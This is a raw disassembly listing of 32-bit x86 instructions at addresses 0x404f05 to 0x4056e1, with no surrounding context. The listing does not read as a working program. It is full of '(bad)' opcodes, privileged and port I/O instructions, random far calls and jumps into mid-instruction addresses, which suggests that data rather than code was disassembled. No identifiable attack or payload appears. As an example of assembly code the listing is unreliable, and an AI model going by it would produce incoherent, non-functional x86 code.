  404f05:	call   FWORD PTR [edx+eax*8]
  404f08:	jmp    0x404f0f
  404f0a:	mov    BYTE PTR [edi],al
  404f0c:	xchg   BYTE PTR [esi+0x72],dh
  404f0f:	cmp    al,0xcb
  404f11:	mov    ds:0x4f1a03a8,al
  404f16:	or     eax,DWORD PTR [edx-0x199b8fd7]
  404f1c:	xor    BYTE PTR [ebp-0x7bdfa410],0xc0
  404f23:	je     0x404ef1
  404f25:	push   ss
  404f26:	xor    DWORD PTR cs:[ecx-0x57d80cf6],ebp
  404f2d:	adc    eax,0xcb772abb
  404f32:	test   eax,0x2e1afa9d
  404f37:	fisttp DWORD PTR ds:0xa3cc9b52
  404f3d:	mov    al,0xfa
  404f3f:	adc    BYTE PTR [edi],bl
  404f41:	mov    DWORD PTR [ebx],ebx
  404f43:	jnp    0x404f9d
  404f45:	jae    0x404ecd
  404f47:	pop    edx
  404f48:	test   DWORD PTR [edx-0x12],edi
  404f4b:	es popf 
  404f4d:	mov    ebp,0xfe80c5f9
  404f52:	mov    eax,ds:0x6e607bfc
  404f57:	pop    ds
  404f58:	test   esp,ecx
  404f5a:	hlt    
  404f5b:	dec    ecx
  404f5c:	xchg   di,ax
  404f5e:	xor    BYTE PTR [ecx-0x119210a4],dl
  404f64:	(bad)  
  404f65:	mov    ebp,0x4ac0e921
  404f6a:	fimul  DWORD PTR [ebx]
  404f6c:	jnp    0x404f74
  404f6e:	xchg   ebx,eax
  404f6f:	and    BYTE PTR [edx+esi*2-0x33432bcd],0xdb
  404f77:	and    DWORD PTR [ecx],ebx
  404f79:	push   ebx
  404f7a:	in     al,0x43
  404f7c:	add    ah,BYTE PTR ds:0x4179db13
  404f82:	outs   dx,DWORD PTR ds:[esi]
  404f83:	rol    BYTE PTR [edx+0x2a],1
  404f86:	xchg   edi,eax
  404f87:	or     al,0x64
  404f89:	aaa    
  404f8a:	in     al,0xbc
  404f8c:	outs   dx,DWORD PTR ds:[esi]
  404f8d:	sub    BYTE PTR [edi],ah
  404f8f:	xchg   ebp,eax
  404f90:	out    0xe8,eax
  404f92:	xchg   DWORD PTR [edx+0x63aae1ad],edi
  404f98:	xchg   edi,eax
  404f99:	or     ebp,ebp
  404f9b:	cmp    eax,0xf8c555f2
  404fa0:	mov    bh,0x4f
  404fa2:	push   esp
  404fa3:	idiv   BYTE PTR ds:0x8a8187f
  404fa9:	mov    ch,0x13
  404fab:	not    DWORD PTR [edx+0x242361bb]
  404fb1:	out    dx,eax
  404fb2:	sub    al,0xec
  404fb4:	rsm    
  404fb6:	aas    
  404fb7:	pop    esp
  404fb8:	jbe    0x40501a
  404fba:	xchg   esp,eax
  404fbb:	mov    DWORD PTR [edx-0x5f],eax
  404fbe:	xchg   DWORD PTR [ebx],ebp
  404fc0:	pop    ebp
  404fc1:	pushf  
  404fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fc3:	inc    ebp
  404fc4:	push   es
  404fc5:	ja     0x405044
  404fc7:	lods   al,BYTE PTR ds:[esi]
  404fc8:	cmp    BYTE PTR ds:0xb3c08d23,bh
  404fce:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  404fd0:	cmp    edi,DWORD PTR [esi+0x0]
  404fd3:	xor    ebx,DWORD PTR [esi]
  404fd5:	ret    0xc417
  404fd8:	js     0x405007
  404fda:	jb     0x404f87
  404fdc:	repz add al,0x6f
  404fdf:	jmp    0x405033
  404fe1:	mov    esp,0xb789ce74
  404fe6:	ins    BYTE PTR es:[edi],dx
  404fe7:	call   0x44537bbc
  404fec:	xchg   ebx,eax
  404fed:	jecxz  0x404fe5
  404fef:	add    al,0xb9
  404ff1:	jl     0x404ff8
  404ff3:	adc    DWORD PTR [ebx],edx
  404ff5:	xchg   ecx,eax
  404ff6:	mov    eax,ds:0xc2eaaf3f
  404ffb:	pop    esp
  404ffc:	into   
  404ffd:	or     eax,DWORD PTR [eax-0x4a3dcace]
  405003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405004:	call   FWORD PTR [ecx]
  405006:	mov    ds,WORD PTR [ecx-0x5a]
  405009:	add    ebp,eax
  40500b:	das    
  40500c:	ret    0x3de2
  40500f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405010:	xlat   BYTE PTR ds:[ebx]
  405011:	dec    ebx
  405012:	sahf   
  405013:	test   BYTE PTR [ebp+0x401391e],bh
  405019:	inc    edx
  40501a:	imul   eax,DWORD PTR [ecx+edi*2+0x3452f6f],0xdfdcf00c
  405025:	xor    dl,dl
  405027:	arpl   WORD PTR [ebp+0x0],bp
  40502a:	jae    0x405041
  40502c:	xchg   ebx,eax
  40502d:	out    0xc5,al
  40502f:	push   ecx
  405030:	inc    ebx
  405031:	dec    ebp
  405032:	sbb    BYTE PTR [edx+0x60],dh
  405035:	sbb    ecx,DWORD PTR [edi+esi*1]
  405038:	mov    ds:0x2e5e8be,al
  40503d:	or     DWORD PTR [ecx],esi
  40503f:	mov    cl,0xb0
  405041:	imul   ecx,DWORD PTR [ebp+0x2da3bed0],0xffffffa9
  405048:	mov    ch,0xdf
  40504a:	push   0xffffffd7
  40504c:	lahf   
  40504d:	in     al,0xa1
  40504f:	mov    esi,0xc1d69211
  405054:	in     eax,0x99
  405056:	jp     0x405063
  405058:	xor    BYTE PTR [edi+0x28c276a],cl
  40505e:	lods   eax,DWORD PTR cs:[esi]
  405060:	in     al,dx
  405061:	mov    cl,0xf7
  405063:	(bad)  
  405064:	or     ecx,DWORD PTR ds:0x3f5f456d
  40506a:	adc    cl,cl
  40506c:	adc    DWORD PTR [edi+0xc6d6189],0xc8929f7f
  405076:	mov    ebp,0x291e151a
  40507b:	loopne 0x405071
  40507d:	pop    ss
  40507e:	(bad)  
  40507f:	jg     0x405075
  405081:	rol    DWORD PTR [ecx-0x62],cl
  405084:	daa    
  405085:	leave  
  405086:	shl    BYTE PTR [ecx],cl
  405088:	xchg   esp,eax
  405089:	inc    ebx
  40508a:	jmp    0x87a5:0xf1f189ca
  405091:	dec    ebp
  405092:	mov    ds:0xf06788d7,al
  405097:	pop    esp
  405098:	clc    
  405099:	dec    edi
  40509a:	inc    ebp
  40509b:	inc    ebx
  40509c:	sbb    esp,DWORD PTR [ebx]
  40509e:	loope  0x40511a
  4050a0:	pop    ebp
  4050a1:	sub    eax,0xc4fc65c5
  4050a6:	pop    es
  4050a7:	loope  0x4050dd
  4050a9:	shl    BYTE PTR [edi-0x5b492650],cl
  4050af:	jge    0x4050a8
  4050b1:	xor    cl,BYTE PTR [edi-0x7e]
  4050b4:	ins    BYTE PTR es:[edi],dx
  4050b5:	popf   
  4050b6:	loop   0x405100
  4050b8:	xchg   edi,eax
  4050b9:	jl     0x4050a6
  4050bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050bc:	dec    esi
  4050bd:	in     al,dx
  4050be:	cmp    bl,0x6a
  4050c1:	cmp    esi,DWORD PTR [ebx]
  4050c3:	mov    cl,0x52
  4050c5:	xchg   edi,eax
  4050c6:	addr16 cdq 
  4050c8:	mov    dh,0xd
  4050ca:	pop    ebx
  4050cb:	jecxz  0x4050c2
  4050cd:	aas    
  4050ce:	pop    ds
  4050cf:	mov    bh,0xa6
  4050d1:	jns    0x40509e
  4050d3:	add    eax,edi
  4050d5:	dec    ecx
  4050d6:	imul   DWORD PTR ss:[eax+ebp*8+0x9]
  4050db:	std    
  4050dc:	cdq    
  4050dd:	ja     0x4050ec
  4050df:	and    ebx,esp
  4050e1:	hlt    
  4050e2:	jmp    0x85164cee
  4050e7:	sbb    ecx,DWORD PTR [esi]
  4050e9:	das    
  4050ea:	(bad)  
  4050eb:	xlat   BYTE PTR ds:[ebx]
  4050ec:	inc    ecx
  4050ed:	imul   dl
  4050ef:	jmp    DWORD PTR [ecx+0x47]
  4050f2:	loop   0x4050c0
  4050f4:	dec    ebp
  4050f5:	xchg   esp,eax
  4050f6:	xchg   DWORD PTR [edx+0x75],ecx
  4050f9:	mov    DWORD PTR [edi-0x73],esp
  4050fc:	ja     0x4050ec
  4050fe:	imul   edi,DWORD PTR [esp+edi*4],0x60
  405102:	repz fld st(1)
  405105:	hlt    
  405106:	das    
  405107:	push   ebp
  405108:	dec    eax
  405109:	xlat   BYTE PTR ds:[ebx]
  40510a:	cmp    ebx,ebx
  40510c:	push   ebx
  40510d:	adc    eax,0xa3196ab1
  405112:	xchg   esi,eax
  405113:	dec    edi
  405114:	shr    DWORD PTR [eax],1
  405116:	shl    DWORD PTR [ebx+ebp*4+0x327f80ee],1
  40511d:	aaa    
  40511e:	(bad)  
  40511f:	cmp    al,0x62
  405121:	push   esi
  405122:	push   es
  405123:	mov    edi,0xc016ec14
  405128:	mov    cl,0xab
  40512a:	mov    al,ds:0xfb4f1d88
  40512f:	or     eax,0xb0be46fe
  405134:	int    0xab
  405136:	loope  0x405161
  405138:	push   esi
  405139:	dec    edx
  40513a:	sti    
  40513b:	and    eax,0x7241c38f
  405140:	push   edx
  405141:	gs (bad) 
  405143:	clc    
  405144:	or     al,BYTE PTR [ecx+0x7b727ff0]
  40514a:	shr    DWORD PTR [esi-0x21],1
  40514d:	sbb    BYTE PTR [ebp-0x3c],ch
  405150:	inc    ebx
  405151:	popa   
  405152:	sub    DWORD PTR [edi-0x7f],ebp
  405155:	xor    al,0xd6
  405157:	cmc    
  405158:	xor    DWORD PTR ds:0xc3ac5109,ebp
  40515e:	lods   eax,DWORD PTR ds:[esi]
  40515f:	leave  
  405160:	dec    esi
  405161:	pop    ds
  405162:	cmp    DWORD PTR [edx],0x44
  405165:	cmovge edx,esi
  405168:	ds data16 int 0x6
  40516c:	jae    0x405147
  40516e:	out    0xdb,eax
  405170:	xchg   edi,eax
  405171:	mov    ecx,0x285ad6d8
  405176:	push   ecx
  405177:	dec    ecx
  405178:	xchg   ebp,eax
  405179:	repnz or DWORD PTR [edi-0x2],0x65bfe862
  405181:	mov    al,0xfc
  405183:	jo     0x40515f
  405185:	cmp    al,BYTE PTR ss:[ecx+0x9]
  405189:	and    WORD PTR [ecx+0x6520da11],bx
  405190:	sbb    eax,0xbb73651d
  405195:	lods   al,BYTE PTR ds:[esi]
  405196:	xor    edx,DWORD PTR [ebx]
  405198:	call   0xb8e9:0xd041f5a4
  40519f:	pop    edx
  4051a0:	call   0x8b6816b4
  4051a5:	shr    DWORD PTR [eax+0x10947455],cl
  4051ab:	xor    dl,BYTE PTR [edi]
  4051ad:	xchg   edi,eax
  4051ae:	aam    0x3e
  4051b0:	dec    edx
  4051b1:	in     al,dx
  4051b2:	push   0xffffffa1
  4051b4:	jge    0x405231
  4051b6:	(bad)  
  4051b7:	xchg   edx,eax
  4051b8:	pop    ds
  4051b9:	(bad)  
  4051ba:	cs out 0xb,eax
  4051bd:	dec    esi
  4051be:	popf   
  4051bf:	inc    esi
  4051c0:	call   ecx
  4051c2:	inc    edx
  4051c3:	outs   dx,DWORD PTR ds:[esi]
  4051c4:	xchg   eax,ebp
  4051c6:	pop    edx
  4051c7:	sub    BYTE PTR [eax+ebx*8+0x34a1a3e3],dh
  4051ce:	int3   
  4051cf:	cmp    BYTE PTR [ebx],cl
  4051d1:	pop    ss
  4051d2:	je     0x40520c
  4051d4:	out    0xc0,eax
  4051d6:	jnp    0x4051be
  4051d8:	inc    dl
  4051da:	aad    0x38
  4051dc:	jne    0x4051b5
  4051de:	outs   dx,DWORD PTR ds:[esi]
  4051df:	fsubr  st,st(6)
  4051e1:	jae    0x405236
  4051e3:	sbb    eax,DWORD PTR ds:0x42a2f5fa
  4051e9:	mov    bl,cl
  4051eb:	sub    DWORD PTR [esi+0x6c],ecx
  4051ee:	cmp    ebx,DWORD PTR [eax-0x7e5a0548]
  4051f4:	pushf  
  4051f5:	int    0xf
  4051f7:	push   ss
  4051f8:	inc    ebx
  4051f9:	mov    esi,0xbde8dc43
  4051ff:	xor    DWORD PTR [esi+0x3b],ebp
  405202:	mov    bh,0x65
  405204:	ficom  DWORD PTR [edi+0x2707e0cf]
  40520a:	loope  0x405241
  40520c:	test   eax,0xe4ea9bb8
  405211:	sbb    ax,0xf5b3
  405215:	mov    dh,0x2c
  405217:	stos   DWORD PTR es:[edi],eax
  405218:	push   ebx
  405219:	push   esi
  40521a:	shr    ebp,1
  40521c:	mov    ds:0x6176ba19,al
  405221:	inc    eax
  405222:	add    al,0xb2
  405224:	add    DWORD PTR [edi],ebx
  405226:	inc    edi
  405227:	mov    edx,esi
  405229:	bound  edx,QWORD PTR [ecx+0x28]
  40522c:	push   ecx
  40522d:	imul   edx,DWORD PTR [ebx],0x6b
  405230:	call   0xbe64:0x22e24822
  405237:	aam    0x4c
  405239:	mov    eax,0x49f083c7
  40523e:	push   eax
  40523f:	aaa    
  405240:	sbb    ch,dh
  405242:	pop    edi
  405243:	jmp    0x6872292c
  405248:	add    eax,0x20b3755
  40524d:	dec    ah
  40524f:	jno    0x405238
  405251:	lock or BYTE PTR [edx+0x58b1cc7b],ch
  405258:	mov    fs,WORD PTR [edx-0x23852cb4]
  40525e:	out    dx,al
  40525f:	daa    
  405260:	shr    DWORD PTR [ebp*8-0x154d886c],0x97
  405268:	ins    BYTE PTR es:[edi],dx
  405269:	adc    DWORD PTR [edx+ebx*4+0xb886dac],ebx
  405270:	dec    ebp
  405271:	fsub   DWORD PTR [esi+0x59]
  405274:	add    al,BYTE PTR [ecx+0x56a36bdd]
  40527a:	les    edi,FWORD PTR [eax-0x22]
  40527d:	add    dh,BYTE PTR [edx+0x2f62cc]
  405283:	push   esi
  405284:	mov    al,ds:0xb45282e5
  405289:	fisttp DWORD PTR [ecx-0x784b191b]
  40528f:	cmp    BYTE PTR [esi+0x3808b1e7],al
  405295:	dec    DWORD PTR [esp+ebp*1-0x774dbacc]
  40529c:	icebp  
  40529d:	dec    esi
  40529e:	leave  
  40529f:	loope  0x4052dc
  4052a1:	dec    edi
  4052a2:	xchg   ebp,eax
  4052a3:	scas   al,BYTE PTR es:[edi]
  4052a4:	fnsave [ebp-0xa951d77]
  4052aa:	ds cmc 
  4052ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ad:	(bad)  
  4052ae:	jmp    0xa631eb87
  4052b3:	scas   al,BYTE PTR es:[edi]
  4052b4:	pop    ebx
  4052b5:	frstor [ecx+ebx*4-0x28312be]
  4052bc:	pop    ecx
  4052bd:	xchg   esi,eax
  4052be:	gs je  0x40524b
  4052c1:	sbb    DWORD PTR ds:0xb450f0a7,0x34
  4052c8:	sub    DWORD PTR [ebp-0x65d2dd62],0xffffffb6
  4052cf:	daa    
  4052d0:	mov    dh,0x65
  4052d2:	mov    dl,0xab
  4052d4:	fdiv   st,st(4)
  4052d6:	imul   esi,esi,0x1e
  4052d9:	(bad)  
  4052db:	pusha  
  4052dc:	cli    
  4052dd:	cmp    esp,DWORD PTR [edi]
  4052df:	sub    eax,0xc97d952a
  4052e4:	imul   edi,DWORD PTR [ecx-0x10],0x41d5f24b
  4052eb:	ret    
  4052ec:	addr16 icebp 
  4052ee:	and    DWORD PTR [esi],0x48165d0
  4052f4:	xchg   edi,eax
  4052f5:	push   esp
  4052f6:	addr16 sub al,0xdf
  4052f9:	mov    bl,0x3b
  4052fb:	sahf   
  4052fc:	test   eax,0xc1ecd650
  405301:	mov    dh,0xd5
  405303:	dec    eax
  405304:	cli    
  405305:	push   ebp
  405306:	stc    
  405307:	push   ebx
  405308:	pusha  
  405309:	cmp    DWORD PTR [ebx-0x2b],ebp
  40530c:	ret    0x7ada
  40530f:	nop
  405310:	mov    bh,0xe1
  405312:	call   0xf3d4:0xf25cec6a
  405319:	add    eax,esi
  40531b:	push   ebx
  40531c:	(bad)  
  40531d:	cli    
  40531e:	or     BYTE PTR [edi-0x20116016],bh
  405324:	pusha  
  405325:	mov    cl,0xe9
  405327:	frstor [edi+0x22]
  40532a:	mov    edx,0xa7ff43e5
  40532f:	sub    esp,ebp
  405331:	push   0xa914998d
  405336:	jmp    0x64f7:0xabc77d25
  40533d:	ins    BYTE PTR es:[edi],dx
  40533e:	sbb    DWORD PTR [ecx+esi*4-0x10],edx
  405342:	pop    es
  405343:	sbb    al,0xb7
  405345:	aas    
  405346:	add    eax,0xb41ae42
  40534b:	call   0xf83e:0xbe05fa2f
  405352:	ja     0x40537d
  405354:	adc    al,0xd0
  405356:	in     eax,0x9b
  405358:	aam    0x74
  40535a:	rol    BYTE PTR [ebp-0xd3c2a1],0xa4
  405361:	std    
  405362:	test   al,0x56
  405364:	mov    bl,0xc2
  405366:	push   0x3ef4bec3
  40536b:	push   0x4703daa6
  405370:	inc    esp
  405371:	xchg   edi,eax
  405372:	std    
  405373:	push   0x34
  405375:	int    0x3e
  405377:	fs mov cl,0x9e
  40537a:	and    al,0x36
  40537c:	sahf   
  40537d:	ja     0x4053dc
  40537f:	dec    ebx
  405380:	push   edi
  405381:	data16 ss int 0x2c
  405385:	loopne 0x405395
  405387:	pop    ebx
  405388:	test   eax,0x6293437d
  40538d:	dec    edx
  40538e:	mov    BYTE PTR [esi],bl
  405390:	bound  edi,QWORD PTR [edi]
  405392:	jmp    0x4053de
  405394:	jbe    0x4053a2
  405396:	lods   al,BYTE PTR ds:[esi]
  405397:	xor    DWORD PTR [esp+ebx*4-0x57],esi
  40539b:	out    0x6f,eax
  40539d:	repnz xor al,0x9e
  4053a0:	ret    0x45e7
  4053a3:	int    0xe4
  4053a5:	jns    0x40535a
  4053a7:	outs   dx,BYTE PTR ds:[esi]
  4053a8:	mov    bh,BYTE PTR [edx-0x2e]
  4053ab:	xor    DWORD PTR [ebx+edx*1],edx
  4053ae:	fiadd  DWORD PTR [ecx-0x2655f8ad]
  4053b4:	sub    al,0xf5
  4053b6:	xchg   esp,eax
  4053b7:	pop    es
  4053b8:	ret    
  4053b9:	or     dl,BYTE PTR [edi-0x69]
  4053bc:	xchg   edx,eax
  4053bd:	adc    eax,0xcc8f734e
  4053c2:	std    
  4053c3:	enter  0xefd4,0xb4
  4053c7:	adc    eax,0xce34d0a5
  4053cc:	arpl   WORD PTR [edi-0x338114c5],bp
  4053d2:	retf   0xebb0
  4053d5:	mov    ebx,0x5484cc93
  4053da:	stc    
  4053db:	and    DWORD PTR [esi+0x47],ebp
  4053de:	xor    al,0x86
  4053e0:	inc    ebx
  4053e1:	out    dx,eax
  4053e2:	out    0x87,al
  4053e4:	push   ds
  4053e5:	aam    0x9
  4053e7:	dec    ebx
  4053e8:	sub    al,0x28
  4053ea:	fisttp DWORD PTR [ebp+0x64879]
  4053f0:	jbe    0x405419
  4053f2:	int    0x68
  4053f4:	pop    ss
  4053f5:	inc    esi
  4053f6:	sub    BYTE PTR [esi+0x61],al
  4053f9:	es cmp al,0xc0
  4053fc:	inc    esi
  4053fd:	pop    eax
  4053fe:	push   edx
  4053ff:	pop    esp
  405400:	dec    eax
  405401:	sbb    ecx,esp
  405403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405404:	sub    eax,0x18215bca
  405409:	push   es
  40540a:	fstp   QWORD PTR ds:0x3f5388d8
  405410:	or     edi,DWORD PTR [ebx-0x16]
  405413:	fdivr  DWORD PTR [edx]
  405415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405416:	pop    es
  405417:	xchg   esp,eax
  405418:	sahf   
  405419:	add    DWORD PTR [edi],edx
  40541b:	xor    al,0x72
  40541d:	test   al,0x8b
  40541f:	sub    DWORD PTR [ebp-0x51],0x2b887af1
  405426:	js     0x405449
  405428:	mov    ah,0x13
  40542a:	mov    ecx,DWORD PTR [edx+edx*1-0xa]
  40542e:	mov    ebp,0x64176396
  405433:	or     ebx,esp
  405435:	push   edi
  405436:	xchg   ch,al
  405438:	ins    BYTE PTR es:[edi],dx
  405439:	fcom   st(1)
  40543b:	lock fsub QWORD PTR [eax+0x59]
  40543f:	lea    edx,[eax]
  405441:	jmp    0x405462
  405443:	mov    ds:0xdb97e343,eax
  405448:	loop   0x405496
  40544a:	stos   BYTE PTR es:[edi],al
  40544b:	pop    edi
  40544c:	push   0xb3b9a9f9
  405451:	lahf   
  405452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405453:	and    eax,0x393630be
  405458:	jne    0x405415
  40545a:	xor    eax,DWORD PTR [esi-0x16b6627f]
  405460:	mov    ds:0x45b6c53a,al
  405465:	pop    eax
  405466:	dec    edx
  405467:	pop    es
  405468:	fdivr  DWORD PTR [edi+ebp*8]
  40546b:	xor    DWORD PTR [ecx],0xffffffcc
  40546e:	adc    edi,DWORD PTR [edi]
  405470:	(bad)  [ebx]
  405472:	or     eax,0xc4a44ce
  405477:	fnstenv [ecx+0x11]
  40547a:	adc    DWORD PTR [ebp-0x4edf271f],ebx
  405480:	leave  
  405481:	pop    es
  405482:	sti    
  405483:	test   al,0x38
  405485:	in     eax,0xc4
  405487:	stc    
  405488:	mov    eax,ds:0x6c3106fc
  40548d:	mov    edx,0x291e9a32
  405492:	fxch   st(0)
  405494:	test   eax,0xb05f3c42
  405499:	aad    0x87
  40549b:	dec    edx
  40549c:	dec    ebp
  40549d:	mov    bh,BYTE PTR [edx]
  40549f:	sbb    DWORD PTR [ecx],eax
  4054a1:	das    
  4054a2:	not    DWORD PTR [edi]
  4054a4:	stos   BYTE PTR es:[edi],al
  4054a5:	loop   0x405432
  4054a7:	inc    esp
  4054a8:	rcl    BYTE PTR [ebx-0x26335ddd],1
  4054ae:	das    
  4054af:	xchg   ebp,eax
  4054b0:	in     eax,dx
  4054b1:	mov    ds:0xdda0505d,eax
  4054b6:	fadd   st,st(7)
  4054b8:	ins    DWORD PTR es:[edi],dx
  4054b9:	inc    ebp
  4054ba:	adc    edi,DWORD PTR [eax+0x46]
  4054bd:	jns    0x405513
  4054bf:	lods   al,BYTE PTR ds:[esi]
  4054c0:	jo     0x4054a5
  4054c2:	jns    0x4054a9
  4054c4:	mov    ebp,0x5ff94338
  4054c9:	mov    cl,0x70
  4054cb:	test   eax,0xc75f4b57
  4054d0:	sti    
  4054d1:	shr    DWORD PTR [ebx],0xb7
  4054d4:	push   esi
  4054d5:	(bad)  
  4054d6:	jns    0x405539
  4054d8:	and    eax,0xe0785977
  4054dd:	mov    ebx,0x4cc26fbd
  4054e2:	sub    eax,0x16e18fe7
  4054e7:	xchg   esp,eax
  4054e8:	mov    ?,WORD PTR [ebx-0x21a973b9]
  4054ee:	fcom   DWORD PTR [eax]
  4054f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054f1:	stos   BYTE PTR es:[edi],al
  4054f2:	call   0x94bc5475
  4054f7:	jg     0x405547
  4054f9:	mov    DWORD PTR [ebx],esp
  4054fb:	sbb    ebx,esi
  4054fd:	inc    ecx
  4054fe:	xchg   ecx,eax
  4054ff:	dec    edx
  405500:	jle    0x40556c
  405502:	adc    eax,0x9bc8d197
  405507:	jg     0x40551e
  405509:	sbb    BYTE PTR [edx-0x73],bl
  40550c:	mov    eax,ds:0x36944111
  405511:	mov    ecx,0xa00ced6
  405516:	aam    0x85
  405518:	mov    edi,0xd5fe0b2a
  40551d:	push   ds
  40551e:	test   bh,ch
  405520:	jge    0x4054d4
  405522:	(bad)  
  405523:	(bad)  
  405524:	out    0x3f,eax
  405526:	xchg   ebp,eax
  405527:	pop    esi
  405528:	mov    BYTE PTR [edx],bh
  40552a:	inc    edi
  40552b:	dec    ebx
  40552c:	retf   0xb340
  40552f:	shr    esi,1
  405531:	mov    ch,0xf6
  405533:	fist   WORD PTR [ecx-0x52]
  405536:	out    0x9c,al
  405538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405539:	aaa    
  40553a:	dec    eax
  40553b:	cmp    BYTE PTR [eax],bh
  40553d:	mov    dl,0x4b
  40553f:	mov    ds:0xd124b289,eax
  405544:	adc    dh,BYTE PTR [edi-0x63c8079d]
  40554a:	pop    eax
  40554b:	cwde   
  40554c:	das    
  40554d:	mov    al,ds:0x8c394aaf
  405552:	sub    eax,0xed120316
  405557:	mov    ds:0xfb3c0f13,al
  40555c:	jb     0x405545
  40555e:	adc    esi,DWORD PTR [edx+0x65870504]
  405564:	jne    0x4055c7
  405566:	push   ebp
  405567:	pop    eax
  405568:	bound  ecx,QWORD PTR [ebx+ecx*2]
  40556b:	data16 add BYTE PTR [ecx-0x391bf28c],ah
  405572:	push   0xffffffa2
  405574:	stc    
  405575:	xor    DWORD PTR [eax-0x7d],ecx
  405578:	dec    esp
  405579:	add    dl,ch
  40557b:	in     al,0xfb
  40557d:	mov    ch,0x69
  40557f:	sub    al,0x59
  405581:	jmp    0x4d2fc056
  405586:	push   ebp
  405587:	or     BYTE PTR [eax],0x7a
  40558a:	pop    ss
  40558b:	scas   al,BYTE PTR es:[edi]
  40558c:	xor    DWORD PTR ds:[edx],eax
  40558f:	mov    edx,0xb1490dde
  405594:	rol    bh,0xd2
  405597:	mov    bh,0x7f
  405599:	mov    dh,0x95
  40559b:	sbb    cl,BYTE PTR [esi]
  40559d:	xor    al,0x7c
  40559f:	test   al,0xe0
  4055a1:	xchg   ebp,eax
  4055a2:	hlt    
  4055a3:	push   es
  4055a4:	adc    BYTE PTR [ebx+0x5ade78e],al
  4055aa:	jbe    0x4055bd
  4055ac:	adc    eax,0xa05b2879
  4055b1:	retf   0xa68c
  4055b4:	rcr    DWORD PTR [edx],1
  4055b6:	inc    edi
  4055b7:	fs mov ch,0x40
  4055ba:	jbe    0x405560
  4055bc:	jmp    0x26c57a42
  4055c1:	add    esi,DWORD PTR [edi+0x65869bc5]
  4055c7:	mov    edx,0x72bf2b2c
  4055cc:	pop    esp
  4055cd:	or     eax,DWORD PTR [ecx-0x71200e6f]
  4055d3:	push   ds
  4055d4:	push   cs
  4055d5:	pop    ebx
  4055d6:	inc    edi
  4055d7:	xchg   esp,eax
  4055d8:	pop    edi
  4055d9:	repz or al,BYTE PTR [esi-0x4e706613]
  4055e0:	pop    ecx
  4055e1:	aad    0x6f
  4055e3:	(bad)  
  4055e4:	mov    ebx,0x50c1c912
  4055e9:	xchg   esp,eax
  4055ea:	xor    eax,0xd66468
  4055ef:	push   es
  4055f0:	jno    0x405655
  4055f2:	dec    edi
  4055f3:	pop    ecx
  4055f4:	or     al,0xf7
  4055f6:	push   edi
  4055f7:	mov    esp,DWORD PTR [edi-0x27dda2a8]
  4055fd:	(bad)  
  4055fe:	xchg   esi,eax
  4055ff:	fs pop ebp
  405601:	sbb    eax,0x4ab98966
  405606:	imul   esp,DWORD PTR [ebp+0x46],0x79
  40560a:	enter  0x6625,0x51
  40560e:	pop    ss
  40560f:	push   es
  405610:	in     eax,0x30
  405612:	inc    esi
  405613:	ins    DWORD PTR es:[edi],dx
  405614:	lods   eax,DWORD PTR ds:[esi]
  405615:	inc    esp
  405616:	xor    ch,BYTE PTR [eax-0x7c]
  405619:	mov    bl,0x0
  40561b:	xor    esi,DWORD PTR [edx-0x7d947afe]
  405621:	out    0xa5,eax
  405623:	sbb    al,0x71
  405625:	lock fldcw WORD PTR [esi+0x369907a2]
  40562c:	dec    esi
  40562d:	cwde   
  40562e:	xchg   esp,eax
  40562f:	cmp    edx,DWORD PTR [edi-0x4598da86]
  405635:	outs   dx,BYTE PTR ds:[esi]
  405636:	inc    eax
  405637:	add    al,0xca
  405639:	jg     0x405645
  40563b:	fistp  DWORD PTR ds:0xd710d952
  405641:	mov    gs,WORD PTR [ebx]
  405643:	push   edx
  405644:	ss xchg esi,eax
  405646:	stos   BYTE PTR es:[edi],al
  405647:	lea    edi,ds:0x1191d43e
  40564d:	adc    bl,BYTE PTR [edi+0x7eb42d79]
  405653:	inc    ecx
  405654:	push   cs
  405655:	cmp    dl,dh
  405657:	lods   al,BYTE PTR ds:[esi]
  405658:	add    eax,0xe24102aa
  40565d:	mov    edx,0xedc71632
  405662:	clc    
  405663:	sbb    cl,BYTE PTR [esi+0x14f5c1b4]
  405669:	inc    eax
  40566a:	cld    
  40566b:	push   edx
  40566c:	mov    ebp,0xbf442fc5
  405671:	scas   al,BYTE PTR es:[edi]
  405672:	int3   
  405673:	pop    ecx
  405674:	add    al,0x9a
  405676:	lahf   
  405677:	mov    ebp,0x74d334f9
  40567c:	shl    DWORD PTR [ebx],0xb5
  40567f:	xchg   BYTE PTR [edx],ah
  405681:	cmp    esi,esp
  405683:	push   ecx
  405684:	loop   0x40560d
  405686:	sub    edx,DWORD PTR [ebx+0x1a9f7a2a]
  40568c:	stos   BYTE PTR es:[edi],al
  40568d:	push   ds
  40568e:	rcl    ah,1
  405690:	(bad)  
  405691:	and    ch,BYTE PTR [ebx-0x53]
  405694:	jge    0x40563a
  405696:	dec    ebp
  405697:	xor    ebx,DWORD PTR [esi]
  405699:	add    eax,0xedbbfda4
  40569e:	inc    ecx
  40569f:	cmp    eax,0x18042fc3
  4056a4:	or     al,ch
  4056a6:	jne    0x405669
  4056a8:	xor    al,0xb
  4056aa:	(bad)
  4056ae:	ja     0x405715
  4056b0:	sahf   
  4056b1:	imul   esi,DWORD PTR [ebp-0x9],0xffffffc7
  4056b5:	push   eax
  4056b6:	pop    esi
  4056b7:	(bad)  
  4056b8:	xchg   sp,ax
  4056ba:	neg    BYTE PTR [ebp+0x2c149532]
  4056c0:	(bad)  
  4056c1:	mov    edi,0xeb2821f4
  4056c6:	or     eax,0xd25d6bc2
  4056cb:	rol    DWORD PTR [ecx+esi*4-0x3cd872f5],cl
  4056d2:	cmp    al,0x41
  4056d4:	inc    eax
  4056d5:	dec    edi
  4056d6:	scas   eax,DWORD PTR es:[edi]
  4056d7:	mov    bh,0xf2
  4056d9:	mov    dl,0xc5
  4056db:	xchg   edi,eax
  4056dc:	xadd   ebp,ebx
  4056df:	sbb    edi,esi
  4056e1:	mov    BYTE PTR [ebp+0x1104c8d3],0x37
